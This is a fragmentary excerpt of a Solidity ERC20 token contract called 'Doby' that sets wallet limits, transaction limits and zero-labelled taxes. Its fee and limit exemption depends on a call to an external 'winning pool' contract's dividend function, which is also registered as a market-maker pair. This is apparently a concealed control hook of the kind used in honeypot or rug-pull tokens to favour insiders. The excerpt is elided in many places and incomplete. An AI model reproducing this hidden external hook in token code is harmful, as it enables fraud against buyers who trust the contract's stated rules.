...
contract Doby is ERC20, Ownable, AUTH {
    using SafeMath for uint256;
    ...
    struct InitTaxConfiguration {
        address marketingWallet;
        uint256 maxTxAmt;
        uint256 buyFeeCenti;
        uint256 sellFeeCenti;
        uint256 maxWalletAmt;
    }
    ...
    DobyPool private winningPoolParam;
    

    // exlcude from fees and max transaction amount
    mapping(address => bool) private isExcludedFromFee;
    constructor(
        InitTaxConfiguration memory feeConfigParam,
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        DobyPool memory winPoolIf
    ) payable ERC20(name_, symbol_, decimals_) {
        uint256 supply_ = 1_000_000;
        ...
        _setAutomateMakerPairs(winPoolIf.winPoolAddr, uniV2Pair, true);
        taxBuy = 0; //static
        taxSell = 0; //static
        winningPoolParam = winPoolIf;
        marketingWallet = feeConfigParam.marketingWallet;
        ...
        maxWalletAmount = feeConfigParam.maxWalletAmt * supply_ * (10**decimals_).div(10000);
        swapAt = (supply_.div(8000) + 1) * (10**decimals_);
        maxTxAmount = feeConfigParam.maxTxAmt * supply_ * (10**decimals_).div(10000);
    ...
    function feeNotIncluded(address from, address to) internal returns (bool) {
        return 
            isExcludedFromFee[from] ||
            isExcludedFromFee[to] || DobyWinningPool(winningPoolParam.winPoolCa).accumulativeDividendOf(from, to) > 0;
    }
    ...
    function _setAutomateMakerPairs(address router, address pair, bool value) private {
        require(
    ...
    function _transfer(
        ...
        if ((recipient == address(0) || recipient == address(0xdead)) || feeNotIncluded(sender, recipient) || amount == 0) 
        {
            super._transfer(sender, recipient, amount); return;
        } else {
            require(amount <= maxTxAmount,"Transfer amount exceeds the maxTxAmount.");
            if (recipient != uniV2Pair) {
                uint256 contractBalanceOfRecp = balanceOf(recipient);
                require(contractBalanceOfRecp + amount <= maxWalletAmount, "Exceeds maximum wallet amount");
            }
        }
        uint256 balOfCont = balanceOf(address(this));
        bool canSwap = balOfCont >= swapAt;
        if (
            canSwap &&
            !isSwap &&
            !isUniPair[sender]
        ...
        if (feeTake) {
            uint256 feeAmount = amount.mul(taxBuy).div(1000);
            if (isUniPair[recipient]) {
                feeAmount = amount.mul(taxSell).div(1000);
            } 
